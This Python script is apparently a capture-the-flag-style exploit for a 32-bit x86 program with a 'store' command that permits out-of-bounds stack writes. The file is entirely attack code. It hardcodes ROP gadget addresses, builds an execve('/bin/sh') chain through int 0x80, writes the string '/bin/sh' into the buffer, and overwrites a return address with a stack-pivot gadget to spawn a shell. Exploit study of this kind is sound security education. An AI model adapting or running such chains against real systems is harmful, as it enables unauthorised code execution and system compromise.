import struct

#buffer_addr = 0xbffff548 # In gdb
buffer_addr = 0xbffff518 # Outside of gdb
dist = -44 # Distance from buffer to RA of `store_number`
binsh_index = 61 # Out of the way and 3x+1 (8 bytes of room)
binsh_addr = buffer_addr + binsh_index*4

STORE = "store\n"
NULL_DWORD = struct.pack("<L", 0)

# Gadgets
add_esp_2c = 0x08049bb7 # add esp, 0x2c ; ret (Pivot)
pop_ecx_pop_ebx_ret = 0x0806f3d1 # pop ecx ; pop ebx ; ret
pop_ebx_pop_edi_ret = 0x080bee63 # pop ebx ; pop edi ; ret
xor_eax_eax_ret = 0x08054c30 # xor eax, eax ; ret
ret_4 = 0x0804854b # ret 4
pop_edx_ret = 0x0806f3aa # pop edx ; ret
pop_eax_ret = 0x080bc4d6 # pop eax ; ret
int_80_ret = 0x08048eaa # int 0x80

s = NULL_DWORD # Index 0
s += struct.pack("<L", pop_ecx_pop_ebx_ret)
s += struct.pack("<L", binsh_addr + 12) # ecx = pointer to ["/bin/sh\x00", NULL]
s += NULL_DWORD # Junk to pop into ebx
s += struct.pack("<L", pop_ebx_pop_edi_ret)
s += struct.pack("<L", binsh_addr) # ebx = pointer to "/bin/sh\x00"
s += NULL_DWORD # Junk to pop into edi
s += struct.pack("<L", xor_eax_eax_ret) # eax = 0
s += struct.pack("<L", pop_edx_ret) # edx = 0
s += NULL_DWORD # Junk to pop into edx
# < Fix EAX to 0xb >
s += struct.pack("<L", ret_4) # ret 4, so stack points past next gap
s += struct.pack("<L", pop_eax_ret) # Pop eax
s += NULL_DWORD # Hopped
s += struct.pack("<L", 0xb) # eax = 0xb = syscall execve
s += struct.pack("<L", int_80_ret) # syscall


assert(len(s) % 4 == 0)
num_chucks = len(s) / 4
commands = []
index = 0
for i in range(num_chucks):
    chunk = s[i*4:i*4+4]
    if index % 3 == 0 or chunk == NULL_DWORD:
        # Skip over every third chunk
        assert(chunk == NULL_DWORD)
        index += 1
        continue
    value = struct.unpack("<L", chunk)[0]
    commands.append(STORE + str(value) + "\n" + str(index) + "\n")
    index += 1

# Write in /bin/sh and a pointer to it at well defined spots
commands.append(STORE + str(struct.unpack("<L", b"/bin")[0]) + "\n" + str(binsh_index) + "\n")
commands.append(STORE + str(struct.unpack("<L", b"/sh\x00")[0]) + "\n" + str(binsh_index + 1) + "\n")
commands.append(STORE + str(buffer_addr + binsh_index*4) + "\n" + str(binsh_index + 3) + "\n")
# Overwrite RA on stack with address of pivot gadget
index = dist / 4
commands.append(STORE + str(add_esp_2c) + "\n" + str(index) + "\n")

commands.append("quit\n")
print "".join(commands)
